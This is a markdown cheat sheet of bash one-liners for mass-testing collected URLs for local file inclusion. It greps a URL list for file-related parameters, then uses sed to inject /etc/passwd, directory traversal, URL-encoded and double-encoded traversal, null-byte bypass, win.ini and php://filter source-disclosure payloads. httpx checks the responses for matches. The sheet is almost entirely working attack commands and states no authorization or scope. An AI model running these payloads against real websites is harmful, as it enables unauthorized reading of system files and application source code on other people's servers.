You need URLS.txt file for this or params.txt
### ▶ GREP for File / Folder Related Parameters

(**this is WHERE we identify possible file or directory inclusion**)
```bash
grep -Ei "file=|path=|page=|dir=|folder=|doc=|include=|inc=|template=|view=|load=|download=|read=|name=|resource=|img=|image=|pdf=" parameter.txt > lfi_candidates.txt
```
### ▶ Remove Duplicate URLs

```bash
sort -u lfi_candidates.txt > lfi_unique.txt
```
### ▶ Basic File Inclusion Test (Linux)

```bash
sed 's/=.*/=\/etc\/passwd/' lfi_unique.txt > lfi_test_basic.txt
```

```bash
httpx -l lfi_test_basic.txt -mr "root:x" -silent
```
### ▶ Directory Traversal Test

```bash
sed 's/=.*/=..\/..\/..\/..\/etc\/passwd/' lfi_unique.txt > lfi_traversal.txt
```

```bash
httpx -l lfi_traversal.txt -mr "root:x"
```

### ▶ URL‑Encoded Traversal

```bash
sed 's/=.*/=..%2f..%2f..%2fetc%2fpasswd/' lfi_unique.txt > lfi_encoded.txt
```

```bash
httpx -l lfi_encoded.txt -mr "root:x"
```

### ▶ Double URL Encoding

```bash
sed 's/=.*/=%252e%252e%252fetc%252fpasswd/' lfi_unique.txt > lfi_double_encoded.txt
```

```bash
httpx -l lfi_double_encoded.txt -mr "root:x"
```
### ▶ Null Byte Bypass (Old PHP)

```bash
sed 's/=.*/=..\/..\/..\/etc\/passwd%00/' lfi_unique.txt > lfi_nullbyte.txt
```

```bash
httpx -l lfi_nullbyte.txt -mr "root:x"
```
### ▶ Windows File Inclusion

```bash
sed 's/=.*/=C:\/Windows\/win.ini/' lfi_unique.txt > lfi_windows.txt
```

```bash
httpx -l lfi_windows.txt -mr "fonts"
```
### ▶ PHP Filter (Source Disclosure)

```bash
sed 's/=.*/=php:\/\/filter\/convert.base64-encode\/resource=index.php/' lfi_unique.txt > lfi_phpfilter.txt
```

```bash
httpx -l lfi_phpfilter.txt -mr "PD9waHA"
```
### ▶ Folder Inclusion Detection (Directory Listing / Errors)

```bash
sed 's/=.*/=..\/..\/..\/..\/' lfi_unique.txt > lfi_folder.txt
```

```bash
httpx -l lfi_folder.txt -mc 200,403 -silent
```
## ✅ HOW YOU KNOW IT’S VULNERABLE

**File LFI**

* `root:x`
* `/bin/bash`
* `win.ini`
* Base64 PHP output

**Folder LFI**

* Directory listing
* `Index of /`
* Java / PHP include errors
* 200 response with unexpected conten
